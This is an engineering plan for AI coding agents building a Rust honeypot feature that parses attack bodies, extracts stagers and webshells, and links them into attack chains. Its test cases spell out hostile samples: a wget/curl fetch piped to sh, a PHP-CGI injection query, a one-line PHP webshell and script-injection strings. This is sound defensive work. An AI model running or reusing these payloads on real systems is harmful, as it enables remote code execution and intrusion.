# Attack Chains and Body X-ray Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Show the whole attack chain from any request, address, campaign or piece, with bodies fully parsed in the UI, then streamline the admin interface.

**Architecture:** A pure, bounded parser (`model::xray`) turns requests and text uploads into layers and pieces. Pieces become node-local, versioned sightings. Chains, campaign joiner edges and every view are read from sightings through one function, `chain(anchor)`.

**Tech Stack:** Rust, axum, askama, sqlx on SQLite, server-rendered SVG, existing crates only (`regex`, `flate2`, `data-encoding`, `sha2`, `serde_urlencoded`, `quick-xml`, `rand`).

**Spec:** `docs/superpowers/specs/2026-11-01-attack-chains-design.md`. Read it first. Do not edit it afterwards: specs are not maintained after implementation. Behaviour and limits go into user docs.

## Global Constraints

- Nodes never fetch, contact or resolve anything found in a payload.
- Nothing from a payload is executed, emulated or passed to an interpreter.
- All payload addresses and URLs in output are defanged (`hxxps://`, `[.]`) and never links. Only "Copy for sandbox" gives the raw URL.
- No `|safe` on anything derived from a body, upload, path or query.
- `xray`, `pieces`, `piece_sightings`, `piece_urls`, `chains`, `chain_pieces`, `piece_results`: node-local, never replicated, never exported.
- Upload bytes and decoded upload text never reach the API, dossier, export or trap. Only `store/uploads.rs` may name `upload_blobs` (`tests/never_served.rs` enforces this).
- Binary uploads are never parsed, rendered or unpacked.
- Decoded text is never stored. Private key material is never stored or displayed by these features, and never used.
- Tests use `192.0.2.0/24`, `198.51.100.0/24`, `203.0.113.0/24`, `example.org` and keys generated for the test, never captured material.
- Parser limits, verbatim: depth 6 layers; total decoded output 256 KiB per source; one decompression 256 KiB, stopped as it streams; 128 layers per source; 256 pieces per source; piece value 512 bytes; 32 URLs per piece.
- No new dependencies. This includes dev-dependencies.
- Every task leaves `cargo fmt --all -- --check`, `cargo clippy --all-targets --locked -- -D warnings` and `cargo test --locked` passing, and adds its `CHANGELOG.md` entry and docs.
- Everything ships as ONE PR and ONE release, from the single branch `feat/attack-chains`, in its worktree, because other agents may use the main checkout. Rebase on `origin/master` as needed. Fix every review finding before merging, minors included.
- End commit messages with `Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>`.

## Review Focus

1. **Bodies that are not UTF-8** (latin-1, NUL bytes, cut multibyte sequences): ranges stay valid, rendering never panics on a char boundary. Task 5.
2. **Crafted bodies aimed at the parser** (base64 nested past the limit, a gzip bomb, thousands of `;`): it stops at the limit, returns `opaque`, and stays fast. Task 1, Task 5.
3. **A deleted request or address, or a row past retention:** its sightings and any URL only it named disappear. Admin deletion must not leave attacker text or a personal address behind. Task 6.
4. **Attacker markup in a value** (`</text><script>`, quotes, a file name with `"`): it renders as text in the strip, X-ray and SVG. Task 5, Task 9, Task 12.
5. **Large shapes** (an address in many chains, a campaign with hundreds of pieces, a page with nothing to show): capped display, no empty cards, no slow page. Task 9, Task 12.

---

## Part 1: Parser and X-ray

### Task 1: Layer tree, limits and decoders

**Files:**
- Create: `src/model/xray/mod.rs`, `src/model/xray/decode.rs`
- Modify: `src/model/mod.rs`

**Interfaces:**
- Produces:

```rust
pub const XRAY_V: i64 = 1;
pub struct Span { pub layer: usize, pub start: usize, pub end: usize }
pub enum LayerKind { Raw, Query, Form, Multipart, MultipartField, Json, Xml, Php, PhpCgi,
                     Base64, Gzip, Hex, Escapes, Shell }
pub struct Layer { pub kind: LayerKind, pub parent: Option<usize>, pub from: Option<Span>,
                   pub text: Vec<u8> }               // bytes, never assumed UTF-8
pub enum OpaqueReason { HighEntropy, UnknownEncoding, TooDeep, OverLimit }
pub struct Opaque { pub at: Span, pub reason: OpaqueReason }
pub struct Xray { pub layers: Vec<Layer>, pub pieces: Vec<Piece>, pub opaque: Vec<Opaque>,
                  pub recipes: Vec<Recipe> }
pub struct Budget { /* depth, output, layers, pieces */ }
pub(crate) fn decode_all(xray: &mut Xray, layer: usize, budget: &mut Budget);
```

`layers` is a flat arena indexed by `usize`, walked with a work queue, so no recursion exists to overflow. `Piece` and `Recipe` start as empty structs here and are filled in Tasks 3 and 4.

- [ ] **Step 1: Write failing tests in `decode.rs`**

`base64_layer_opens_printable_text`, `base64url_opens`, `random_token_is_not_a_layer` (a 32-character session id yields no layer), `gzip_after_base64_opens`, `percent_run_opens`, `hex_escapes_open`, `depth_stops_at_6_with_too_deep` (7 nested base64 layers: exactly 6 open and one `Opaque { reason: TooDeep }`), `gzip_bomb_stops_at_256_kib` (a 10 MiB gzip of zeros: output at most `256 * 1024`, reason `OverLimit`), `total_output_stops_at_256_kib`, `high_entropy_is_opaque`.

- [ ] **Step 2: Run them to see them fail**

Run: `cargo test --lib model::xray`. Expected: FAIL, module missing.

- [ ] **Step 3: Implement `decode_all`**

Accept base64 only when the output is mostly printable or starts with a gzip, zlib or PEM marker. Read `flate2` through `Read::take(limit + 1)`, so a bomb stops as it streams. Use `data-encoding` for base64 and `regex` to find candidates; the `regex` crate does not backtrack.

- [ ] **Step 4: Run the tests**

Run: `cargo test --lib model::xray`. Expected: PASS.

- [ ] **Step 5: Commit**

`git commit -m "xray: layer tree, limits and decoders"`

### Task 2: Containers

**Files:**
- Create: `src/model/xray/container.rs`
- Modify: `src/model/xray/mod.rs`

**Interfaces:**
- Produces: `pub enum Source<'a> { Request { method: &'a str, path: &'a str, query: Option<&'a str>, body: Option<&'a [u8]>, sender: Option<&'a str> }, Upload { name: Option<&'a str>, text: &'a [u8], sender: Option<&'a str> } }` and `pub fn parse(source: Source<'_>, policy: &Policy) -> Xray`. `Policy` is defined in Task 4; use `Policy::default()` until then.

- [ ] **Step 1: Write failing tests**

`query_values_are_decoded`, `form_values_are_decoded`, `multipart_fields_are_layers`, `multipart_file_name_is_read` (the name `p2s|O:8:"stdClass":0:{}` survives), `random_padding_fields_collapse` (fields `pad_0`..`pad_4` with random values mark `collapsed = 5` on the first and appear once), `json_strings_are_layers`, `xml_text_is_a_layer`, `php_block_is_a_layer`, `php_base64_decode_call_opens_inner_text`, `php_gzinflate_chain_opens`, `php_cgi_injection_is_a_layer` (query `%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input` gives `LayerKind::PhpCgi`, and the body is read as PHP).

- [ ] **Step 2: Run them to see them fail**

Run: `cargo test --lib model::xray::container`. Expected: FAIL.

- [ ] **Step 3: Implement `parse` and the container readers**

Parse multipart by the header boundary or, as in `/index.php` bodies with no boundary line, by `Content-Disposition` lines. PHP is matched as text patterns over `system`, `shell_exec`, `exec`, `passthru`, `eval`, `assert`, `base64_decode`, `gzinflate`, `gzuncompress`, `str_rot13`, `hex2bin`, `chr()` runs.

- [ ] **Step 4: Run the tests**

Run: `cargo test --lib model::xray`. Expected: PASS.

- [ ] **Step 5: Commit**

`git commit -m "xray: containers and PHP layers"`

### Task 3: Shell recipes

**Files:**
- Create: `src/model/xray/shell.rs`
- Modify: `src/model/xray/mod.rs`

**Interfaces:**
- Produces:

```rust
pub enum Step { Prepare(String), Write(Option<Span>), Fetch { tool: String, target: Span, saves: bool },
                Run { what: String, tag: Option<String> }, Arm, Wipe, Cleanup, Other(String) }
pub enum Node { Step(Step), Pipe(Vec<Node>), Try { first: Vec<Node>, fallback: Vec<Node> } }
pub struct Recipe { pub layer: usize, pub nodes: Vec<Node>, pub normal: String }
```

- [ ] **Step 1: Write failing tests**

`pipe_to_sh_runs_the_fetch` (`(wget -qO- https://example.org/sh || curl -sk https://example.org/sh) | sh -s apache` gives a `Try` of two fetches, a run, tag `apache`); `if_else_keeps_both_branches` (`scp … ; if [ $? -eq 0 ]; then … sh out_sh t.x; else (wget … ) | sh -s t.x; fi`); `tag_from_a_dropped_binary` (`/tmp/Mozi.a jaws`); `mozi_steps_are_named` (prepare, wipe, fetch, arm, run); `command_substitution_and_backticks_open`; `quotes_do_not_split`; `normal_form_hides_hosts_and_numbers` (two recipes differing in host, port and file name share `normal`); `ten_thousand_semicolons_stay_within_limits`.

- [ ] **Step 2: Run them to see them fail**

Run: `cargo test --lib model::xray::shell`. Expected: FAIL.

- [ ] **Step 3: Implement a byte tokeniser, then the recipe tree**

Tokenise `;`, `&&`, `||`, `|`, `$( )`, backticks, quotes, `if`/`then`/`else`/`fi`. A `Fetch` is `saves` when its output is piped to a shell, written with `-O`/`>`, or later run. An `||` of two fetches is a `Try`. Tokens over the piece limit stop the recipe and add `OverLimit`.

- [ ] **Step 4: Run the tests**

Run: `cargo test --lib model::xray`. Expected: PASS.

- [ ] **Step 5: Commit**

`git commit -m "xray: shell recipes with branches"`

### Task 4: Pieces, keys, webshell profile and defanging

**Files:**
- Create: `src/model/xray/pieces.rs`, `src/model/xray/key.rs`, `src/model/defang.rs`, `rules/evidence/shared_hosts.toml`
- Modify: `src/model/xray/mod.rs`, `src/model/mod.rs`

**Interfaces:**
- Produces:

```rust
pub enum PieceKind { Exploit, Recipe, Tag, ShellProfile, Stager, Key }   // File comes from the store
pub enum Role { Exploit, Tag, Recipe, Stager, SelfHosted, Queried, Key, File, Opaque }
pub enum Grade { Seen, Claimed, External }
pub struct Piece { pub kind: PieceKind, pub role: Role, pub grade: Grade, pub value: String,
                   pub url: Option<String>, pub at: Span }
pub struct Policy { /* shared hosts */ }  impl Policy { pub fn embedded() -> &'static Policy; }
pub fn mask_ranges(xray: &Xray, layer: usize) -> Vec<(usize, usize)>;
pub fn defang(s: &str) -> String;                       // in model::defang
```

- [ ] **Step 1: Write failing tests**

- `fetched_and_piped_url_is_a_stager`, value `example.org`, `url` the full URL, grade `Claimed`
- `queried_url_is_not_a_stager`: a JS `fetch` of `http://169.254.169.254/latest/` and a host only read give role `Queried`
- `private_hosts_are_queried`: `192.168.1.1`, `127.0.0.1`, `0.0.0.0`, `${api}`, `schemas.xmlsoap.org`
- `shared_host_keeps_the_full_url`: `https://pastebin.com/raw/abc?x=1` gives value `https://pastebin.com/raw/abc`
- `sender_is_self_hosted`: URL host equals `sender`
- `port_is_dropped_from_the_value`
- `exploit_piece_needs_something_executable`: `GET /.env` gives no pieces; `POST /x` with a recipe gives one
- `exploit_value_has_method_shape_and_query_names`: `POST /hello.world ?-d allow_url_include -d auto_prepend_file`
- `tag_is_claimed`
- `openssh_key_fingerprint_matches_ssh_keygen`: a test key generated once with `ssh-keygen`, with the expected `SHA256:` string pinned
- `key_masked_by_marker_alone`: `BEGIN` with no `END`, and an unparsable body, are masked to the end of text
- `key_is_masked_in_raw_layer_when_unencoded`
- `profile_reads_webshell`: `<?php system($_GET['cmd']); echo 'mr0x02'; ?>` gives value `input=$_GET[cmd];exec=system;marker=mr0x02`
- `profile_notes_a_password_check`
- `defang_handles_urls_and_addresses`: `https://192.0.2.1/sh` gives `hxxps://192[.]0[.]2[.]1/sh`; IPv6 and already defanged text stay safe

- [ ] **Step 2: Run them to see them fail**

Run: `cargo test --lib model::xray::pieces model::defang`. Expected: FAIL.

- [ ] **Step 3: Implement**

The fingerprint reads the OpenSSH container's public section, then takes SHA-256 of that blob, base64 without padding, prefixed `SHA256:`. Other PEM keys: `sha256-pem:` plus the hex of the normalised PEM. `shared_hosts.toml` starts with `pastebin.com`, `surge.sh`, `github.com`, `githubusercontent.com`, `transfer.sh`, `gist.github.com`. Match by suffix on a dot boundary. Load it with `include_str!`, as other `rules/evidence` files are.

- [ ] **Step 4: Run the tests**

Run: `cargo test --lib model::xray model::defang`. Expected: PASS.

- [ ] **Step 5: Commit**

`git commit -m "xray: pieces, key fingerprints, webshell profiles, defanging"`

### Task 5: X-ray view on request and upload pages

**Files:**
- Create: `templates/_xray.html`, `assets/js/xray.js`, `src/admin/xray.rs`
- Modify: `src/store/uploads.rs`, `src/admin/pages.rs`, `src/admin/uploads.rs`, `src/admin/mod.rs`, `src/store/inspect.rs`, `templates/request.html`, `templates/admin_upload.html`, `assets/css/35-pages.css`, `src/model/xray/mod.rs`, `docs/operations.md`, `CHANGELOG.md`, `tests/never_served.rs`

**Interfaces:**
- Consumes: `model::xray::{parse, Source, Policy, mask_ranges}`, `model::defang::defang`.
- Produces: `pub struct XrayView { pub raw: Vec<Seg>, pub layers: Vec<LayerView> }`, `pub fn xray_view(x: &Xray) -> XrayView` in `src/admin/xray.rs`; `pub async fn text_for_xray(conn: &mut SqliteConnection, u: &UploadRow) -> Result<Option<Vec<u8>>>` in `src/store/uploads.rs`. `Seg { text: String, link: Option<String>, masked: bool }`.

- [ ] **Step 1: Write failing tests**

In `src/model/xray/mod.rs`:
- `arbitrary_bytes_never_panic`: 20,000 seeded `rand` inputs, up to 64 KiB, from mixed alphabets of printable text, encoded text, NUL, high bytes and cut UTF-8 sequences. Every result holds within the limits, and every `Span` is in bounds of its layer. It finishes in under 30 s in a debug build.
- `pathological_input_is_fast`: 64 KiB of `$(`, of `;`, and of nested base64 each finish in under 1 s.

In `src/admin/xray.rs`:
- `segments_split_on_char_boundaries_of_lossy_text` (latin-1 and NUL input; Review Focus 1)
- `masked_ranges_replace_key_text` (the output has no `PRIVATE KEY` body bytes)

In `src/admin/pages.rs`:
- `request_page_shows_layers_and_recipe`
- `request_page_escapes_attacker_markup` (a body and value of `</pre><script>alert(1)</script>` appear only escaped; Review Focus 4)
- `body_over_16_kib_is_shown_to_64_kib`
- `opaque_body_says_why`

In `src/admin/uploads.rs`:
- `text_upload_shows_xray`
- `binary_upload_shows_no_xray` (sniffed `elf`: the page has the zip and no parsed content)

In `tests/never_served.rs`:
- `api_and_dossier_carry_no_upload_text`. Keep `only_the_upload_store_names_the_content_table` as it is.

- [ ] **Step 2: Run them to see them fail**

Run: `cargo test --lib admin::xray admin::pages admin::uploads && cargo test --test never_served`. Expected: FAIL.

- [ ] **Step 3: Implement**

Replace the Body card with `_xray.html`, directly under the first card, and keep the text and hex toggle. `xray.js` pairs elements sharing `data-l` on hover and focus; everything is readable without it. The X-ray is computed in the handler, from stored bytes. Text uploads are `sniffed_type` text or php and printable. Rewrite the rule at `docs/operations.md:528-532` to the spec's "Upload rule change", and update the module comment of `tests/never_served.rs`.

- [ ] **Step 4: Run the full suite**

Run: `cargo test --locked`. Expected: PASS.

- [ ] **Step 5: Commit**

`git commit -m "admin: body X-ray on request and upload pages"`

---

## Part 2: Pieces and Links

### Task 6: Storage and extraction

**Files:**
- Create: `src/store/migrations/0052_chains.sql`, `src/store/pieces.rs`
- Modify: `src/store/mod.rs`, `src/store/maintenance.rs`, `src/store/cli.rs`, `src/lib.rs`, `src/store/uploads.rs`

**Interfaces:**
- Consumes: `model::xray::{parse, XRAY_V, Piece, PieceKind, Role, Grade}`.
- Produces: `pub fn piece_hash(kind: &str, value: &str) -> i64` (`crate::canary::hash` over `kind + "\0" + value`); `pub async fn backfill(pool: &SqlitePool) -> Result<u64>`; `pub async fn refresh_counts(conn: &mut SqliteConnection) -> Result<()>`; `Store::pieces_of_source(kind, id)`, `Store::piece(hash)`, `Store::piece_urls(hash)`. Kind strings: `exploit`, `recipe`, `tag`, `shell-profile`, `stager`, `key`, `file`.

- [ ] **Step 1: Write failing tests in `src/store/pieces.rs`**

`extraction_writes_sightings_and_urls`, `backfill_is_batched_and_idempotent`, `new_xray_version_rederives`, `light_rows_are_skipped`, `upload_file_piece_needs_32_bytes`, `url_cap_keeps_the_newest_32`, `deleting_a_request_removes_its_sightings`, `deleting_an_ip_removes_its_sightings`, `retention_removes_sightings`, `url_only_a_deleted_source_named_is_gone_after_refresh` (Review Focus 3), `tombstoned_rows_leave_no_sightings`.

- [ ] **Step 2: Run them to see them fail**

Run: `cargo test --lib store::pieces`. Expected: FAIL.

- [ ] **Step 3: Write the migration**

Use the spec's tables. Add triggers so every deletion path is covered without touching each one:

```sql
CREATE TRIGGER requests_del_sightings AFTER DELETE ON requests BEGIN
  DELETE FROM piece_sightings WHERE source_kind = 'request' AND source_id = OLD.id; END;
CREATE TRIGGER uploads_del_sightings AFTER DELETE ON uploads BEGIN
  DELETE FROM piece_sightings WHERE source_kind = 'upload' AND source_id = OLD.id; END;
```

Register it in `src/store/mod.rs` after 0051.

- [ ] **Step 4: Implement extraction**

Follow `shapes::backfill`: batches on `xray_v < XRAY_V`, ordered by id, in short write transactions, with the parse done outside any transaction. On a version change, clear pieces and set `xray_v = 0`. `refresh_counts` recomputes `ips`, `sources`, `first_seen`, `last_seen` and deletes pieces and `piece_urls` with no sightings left, except pieces that have `piece_results`. Run it in the startup backfill before campaigns, in the maintenance loop before each campaign pass, and in `src/store/cli.rs` next to the shapes backfill.

- [ ] **Step 5: Run the tests**

Run: `cargo test --lib store::`. Expected: PASS.

- [ ] **Step 6: Commit**

`git commit -m "store: pieces and sightings from the X-ray"`

### Task 7: Links kinds

**Files:**
- Modify: `src/store/links.rs`, `src/admin/links.rs`, `src/admin/glossary.rs`, `src/admin/views.rs`, `templates/admin_link.html`, `assets/js/linkgraph.js`, `docs/detection.md`, `CHANGELOG.md`

**Interfaces:**
- Produces: `LinkKind::{Stager, Key, File, Recipe, ExploitTag}`; keys `stager`, `key`, `file`, `recipe`, `exploit-tag`. `identity()` is true for the first three.

- [ ] **Step 1: Write failing tests**

`stager_is_an_identity_kind`, `recipe_and_tag_are_software_kinds`, `link_item_reads_sightings`, `graph_includes_piece_kinds`, `piece_page_shows_defanged_value` (`hxxps://`, no `<a href` on the value), `stager_page_lists_urls_with_copy_for_sandbox`, `sha256_pivot_redirects_to_file_page`, `every_kind_has_a_glossary_line`.

- [ ] **Step 2: Run them to see them fail**

Run: `cargo test --lib store::links admin::links`. Expected: FAIL.

- [ ] **Step 3: Implement**

Read these kinds from `piece_sightings` in `link_item`, `links_list`, `find_value` and `link_graph`. `by_node` and `host_kind` stay false and `None`. The new kinds do not feed campaigns yet; that is Task 11.

- [ ] **Step 4: Run the full suite**

Run: `cargo test --locked`. Expected: PASS.

- [ ] **Step 5: Commit**

`git commit -m "links: stagers, keys, files, recipes and exploit tags"`

---

## Part 3: Chains

### Task 8: Building chains

**Files:**
- Create: `src/store/chains.rs`
- Modify: `src/store/mod.rs`, `src/store/campaigns.rs`, `src/trap/decoy/mod.rs`, `src/trap/mod.rs`

**Interfaces:**
- Produces: `pub const CHAIN_V: i64 = 1;`, `pub async fn rebuild(tx: &mut SqliteConnection) -> Result<()>`, `pub(crate) fn connect(sightings: &[JoinerSighting]) -> Vec<ChainOut>` (pure), `pub struct JoinerSighting { piece: i64, source: (u8, i64), ip: i64, ts: String }`, and `pub fn keeps_its_own_answer(method: &str, path: &str, query: Option<&str>) -> bool` in `trap::decoy`.

- [ ] **Step 1: Write failing tests for `connect` and `rebuild`**

- `one_forged_body_fuses_nothing`: one source naming two stagers leaves two chains
- `two_addresses_connect_joiners`
- `sharing_a_recipe_connects_nothing`
- `one_address_using_two_stagers_connects_nothing`
- `file_over_the_cap_is_left_out`: on 51 addresses, with `HARD_FANOUT_MAX = 50`
- `chain_key_is_its_oldest_joiner` and it stays when the chain grows
- `source_with_two_unconnected_joiners_counts_in_both`
- `describers_attach_by_source_not_by_address`: an unrelated request by the same address adds nothing
- `follow_ups_attach_through_the_file`
- `root_webshell_rows_are_not_follow_ups`: a row answered `webshell` on `/`, and on a decoy path, gives no follow-up
- `dead_end_is_a_404_for_the_file_within_60_seconds`, with 61 seconds and a different address as negatives

- [ ] **Step 2: Run them to see them fail**

Run: `cargo test --lib store::chains`. Expected: FAIL.

- [ ] **Step 3: Implement**

`connect` counts distinct addresses per joiner pair and unions pairs with at least 2. Extract the condition at `src/trap/mod.rs:994-995` (`path != "/"` and `decoy::choose(…).is_none()`) into `keeps_its_own_answer`, call it from both places, and make it answer the same for every presentation the trap can use. Call `rebuild` inside `recompute_campaigns`'s transaction, and add `XRAY_V`, `CHAIN_V`, the sighting count and the newest sighting time to `signature` (`src/store/campaigns.rs:753`).

- [ ] **Step 4: Run the tests**

Run: `cargo test --lib store::`. Expected: PASS.

- [ ] **Step 5: Commit**

`git commit -m "store: chains from joiners, guarded against forgery"`

### Task 9: `chain()`, the strip and the Chains list

**Files:**
- Create: `templates/_chain_strip.html`, `templates/admin_chains.html`, `src/admin/chains.rs`
- Modify: `src/store/chains.rs`, `src/admin/mod.rs`, `src/admin/views.rs`, `src/admin/pages.rs`, `src/admin/uploads.rs`, `src/admin/links.rs`, `src/admin/campaigns.rs`, `templates/request.html`, `templates/admin_upload.html`, `templates/_target.html`, `templates/admin_link.html`, `templates/campaign.html`, `assets/css/35-pages.css`, `docs/overview.md`, `docs/detection.md`, `CHANGELOG.md`

**Interfaces:**
- Produces:

```rust
pub enum Anchor<'a> { Request(i64), Upload(&'a str), Ip(i64), Campaign(&'a str), Piece(i64) }
pub enum Mark { Seen, Claimed, External, Gap, DeadEnd }
pub struct StageRow { pub piece: Option<i64>, pub label: String, pub detail: String, pub mark: Mark,
                      pub joiner: bool, pub here: bool, pub dim: bool, pub href: Option<String> }
pub struct Stage { pub name: &'static str, pub rows: Vec<StageRow> }
pub struct Chain { pub key: Option<String>, pub stages: [Stage; 5], pub ips: i64, pub sources: i64,
                   pub first_seen: String, pub last_seen: String }
impl Store { pub async fn chains_of(&self, a: Anchor<'_>) -> Result<Vec<Chain>>; }
```

A joinerless request gets its one-source chain from `Anchor::Request`; its links to the address's chains come from `Anchor::Ip`.

Stage names, verbatim: `Exploit`, `Command`, `Delivery`, `Payload`, `Follow-up`.

- [ ] **Step 1: Write failing tests**

- `same_chain_from_all_anchors`: request, address, campaign and piece return the same `key`
- `exploit_rows_group_by_tag_before_the_first_dot`: `cve_2024_4577` and `cve_2024_4577.selfrep` are one row listing both paths
- `payload_is_a_gap_without_a_result`
- `uploaded_text_fills_payload_as_seen`
- `dead_end_shows_in_follow_up`
- `joinerless_request_gets_its_own_chain_and_a_link_to_the_addresses_chains`
- `request_without_pieces_shows_no_strip`, and no empty card (Review Focus 5)
- `address_page_opens_the_newest_and_caps_at_5`, with a link to the rest
- `address_strip_is_admin_only`: the public `/ip/` page has none of it
- `strip_escapes_a_hostile_value` (Review Focus 4)
- `strip_marks_evidence_in_text`: "claimed" appears as words, not only as a border style
- `chains_page_lists_newest_first`

- [ ] **Step 2: Run them to see them fail**

Run: `cargo test --lib store::chains admin::chains`. Expected: FAIL.

- [ ] **Step 3: Implement**

Add `("chains", "/admin/evidence/chains", "Chains")` first under Evidence in `ADMIN_TREE`. The strip is server-rendered, wraps to a stack on narrow screens, and goes: at the top of request and upload pages; as the first admin section in `_target.html`; on campaign pages, one per chain; and on piece pages.

- [ ] **Step 4: Run the full suite**

Run: `cargo test --locked`. Expected: PASS.

- [ ] **Step 5: Commit**

`git commit -m "admin: the chain strip on every page and a Chains list"`

### Task 10: Dossier and API

**Files:**
- Modify: `src/admin/dossier.rs`, `src/admin/api_v1.rs`, `docs/api-v1.md`, `docs/openapi.json`, `CHANGELOG.md`

**Interfaces:**
- Consumes: `Store::chains_of`.
- Produces: JSON fields `chain` and `xray`; routes `GET /api/v1/chains`, `GET /api/v1/chains/{key}`.

- [ ] **Step 1: Write failing tests**

`request_dossier_has_chain_and_xray_summary`, `ip_dossier_lists_chains`, `campaign_dossier_lists_chains`, `dossier_v_stays_1`, `xray_summary_has_no_decoded_upload_text`, `key_material_is_not_in_the_chain_or_xray_fields`, `chains_api_needs_a_scope` (using the same scope as `/api/v1/campaigns/{key}/dossier`), `openapi_lists_chains`.

- [ ] **Step 2: Run them to see them fail**

Run: `cargo test --lib admin::dossier admin::api_v1`. Expected: FAIL.

- [ ] **Step 3: Implement**

Values appear as `value` and `defanged`. The `xray` summary holds layer kinds, pieces and opaque reasons, with no layer text.

- [ ] **Step 4: Run the full suite, then commit**

Run: `cargo test --locked`. Expected: PASS.

`git commit -m "api: chains in dossiers and /api/v1/chains"`

---

## Part 4: Campaigns and flow map

### Task 11: Joiner edges

**Files:**
- Create: `src/store/migrations/0053_campaign_joiners.sql`
- Modify: `src/store/campaigns.rs`, `src/store/mod.rs`, `src/admin/campaigns.rs`, `src/admin/glossary.rs`, `templates/campaign.html`, `docs/detection.md`, `docs/dataset.md`, `CHANGELOG.md`

**Interfaces:**
- Produces: `CAMPAIGN_V = 3`; edge kinds `stager`, `key`, `file`; `campaign_edges.merged INTEGER NOT NULL DEFAULT 1`; `campaigns.joiner_edges INTEGER NOT NULL DEFAULT 0`; `Input::joiners: Vec<(&'static str, String, i64, String)>`.

- [ ] **Step 1: Write failing tests on `compute`**

- `joiner_groups_singletons`: 60 addresses on one stager form one campaign of 60, past `HARD_FANOUT_MAX`
- `joiner_makes_a_star`: n addresses give n−1 edges to the oldest
- `value_on_one_address_forms_no_edge`
- `one_forged_address_does_not_merge_groups`
- `forged_stager_and_key_from_one_address_do_not_merge`: the guard counts addresses, not links
- `k_addresses_in_each_group_merge`
- `k_on_one_side_only_does_not_merge`
- `unmet_merge_keeps_its_edge_unmerged`
- `joiners_do_not_feed_the_soft_guard`
- `file_keeps_the_fanout_cap`
- `shared_host_value_joins_by_full_url`
- `hard_edges_count_ignores_joiners`, and `joiner_edges` counts them

- [ ] **Step 2: Run them to see them fail**

Run: `cargo test --lib store::campaigns`. Expected: FAIL.

- [ ] **Step 3: Implement the phase after the soft guard (`src/store/campaigns.rs:1236`)**

Run it only when `p.guard` is `Some(k)`, so `Params::V1` stays a clean baseline in reports.

```text
for each value, in sorted order, with at least 2 addresses:
  edges: every address to the value's oldest address (star, Link with kind stager|key|file)
repeat until nothing changes:
  for each value:
    groups = current groups of its addresses
    singletons (size 1) union into the group with most naming addresses,
      ties by root IP text; if all are singletons, union them all
    two groups of size >= 2 union only if each has >= k distinct naming addresses
edges whose ends stayed apart: merged = 0
```

Read `Input.joiners` from `piece_sightings` where `role` is `stager`, `key` or `file`, using the `chains` filter for files. Show the edges as claimed in `campaign.html`, with "not merged" where `merged = 0`.

- [ ] **Step 4: Run the tests**

Run: `cargo test --lib store::campaigns`. Expected: PASS.

- [ ] **Step 5: Commit**

`git commit -m "campaigns: guarded joiner edges (v3)"`

### Task 12: Flow map

**Files:**
- Create: `templates/_chain_flow.html`, `src/admin/flow.rs`
- Modify: `src/admin/campaigns.rs`, `src/admin/mod.rs`, `templates/campaign.html`, `assets/css/45-viz.css`, `CHANGELOG.md`

Before starting, load the `dataviz` skill.

**Interfaces:**
- Consumes: `Chain`.
- Produces: `pub fn flow(chains: &[Chain]) -> FlowView` with columns, boxes and bands as numbers the template draws, and a `rows` table alternative.

- [ ] **Step 1: Write failing tests**

`band_width_follows_requests`, `gap_is_drawn_as_gap`, `over_12_pieces_group_into_n_more` (Review Focus 5), `table_alternative_has_every_row`, `hostile_label_is_escaped_in_svg` (`</text><script>`; Review Focus 4), `campaign_page_has_flow_above_members`, `campaign_without_chains_has_no_flow`, `600_piece_campaign_renders_under_a_second`.

- [ ] **Step 2: Run them to see them fail**

Run: `cargo test --lib admin::flow`. Expected: FAIL.

- [ ] **Step 3: Implement**

Server-rendered SVG with no JavaScript, using the existing tokens. Check light and dark.

- [ ] **Step 4: Run the full suite, then commit**

Run: `cargo test --locked`. Expected: PASS.

`git commit -m "admin: flow map on campaign pages"`

---

## Part 5: Trap fix and dead ends

### Task 13: Answer where the file manager looks

**Files:**
- Modify: `src/trap/upload.rs`, `src/store/chains.rs`, `src/admin/chains.rs`, `templates/admin_chains.html`, `docs/operations.md`, `CHANGELOG.md`
- Test: `tests/uploads.rs`

**Interfaces:**
- Produces: `Store::dead_ends(limit: i64) -> Result<Vec<DeadEnd>>`, grouped by path; a "Dead ends" tab at `/admin/evidence/chains?tab=dead-ends`.

- [ ] **Step 1: Confirm the route on a read-only observer query**

Run: join `uploads` to `requests` on `request_uid = uid` where `filename = 'pr3d4t0r.php'`, with `sqlite3 -readonly`, and read the paths. Expected: `/wp-file-manager/lib/php/connector.minimal.php` or a path ending in it. If not, make Step 2's test use the path found, and report it.

- [ ] **Step 2: Write failing tests**

`file_manager_upload_lands_in_lib_files` (`answered_path` is `/wp-content/plugins/wp-file-manager/lib/files/a.php`); `other_script_uploads_stay_in_uploads`; `get_of_the_landed_file_answers_as_webshell_and_records_the_command`; `file_there_does_not_take_over_a_decoy_path`; `path_traversal_in_the_file_name_stays_inside`; `dead_ends_group_by_path`; `dead_end_tab_lists_a_404_after_upload`.

- [ ] **Step 3: Run them to see them fail**

Run: `cargo test --test uploads && cargo test --lib store::chains`. Expected: FAIL.

- [ ] **Step 4: Implement**

In `take` (`src/trap/upload.rs:364`), when `kind` is `Script` and `path` ends with the connector path, use `/wp-content/plugins/wp-file-manager/lib/files/{name}`. `name()` already sanitises the file name.

- [ ] **Step 5: Run the full suite, then commit**

Run: `cargo test --locked`. Expected: PASS.

`git commit -m "trap: answer uploaded files where the file manager looks"`

---

## Part 6: External results

### Task 14: Sandbox results

**Files:**
- Modify: `src/store/pieces.rs`, `src/store/chains.rs`, `src/admin/links.rs`, `templates/admin_link.html`, `docs/operations.md`, `CHANGELOG.md`

**Interfaces:**
- Produces: `Store::add_piece_result(piece: i64, r: &NewResult, by: &str) -> Result<i64>`; `POST /admin/evidence/links/{kind}/{value}/results`; `pub struct NewResult { sha256: Option<String>, family: Option<String>, source_url: Option<String>, note: Option<String> }`.

- [ ] **Step 1: Write failing tests**

`result_fills_payload_for_the_whole_chain` with mark `External`; `result_survives_a_recompute_and_an_xray_version_change`; `result_form_only_on_stager_and_file`; `result_needs_csrf_and_a_session`; `result_is_audit_logged`; `sha256_must_be_64_hex`; `source_url_renders_as_text_not_a_link`; `result_is_not_replicated`.

- [ ] **Step 2: Run them to see them fail**

Run: `cargo test --lib store::pieces admin::links`. Expected: FAIL.

- [ ] **Step 3: Implement**

Follow an existing admin form for CSRF and audit logging. Results key on the piece hash, which is stable across rebuilds.

- [ ] **Step 4: Run the full suite, then commit**

Run: `cargo test --locked`. Expected: PASS.

`git commit -m "admin: record sandbox results on stagers and files"`

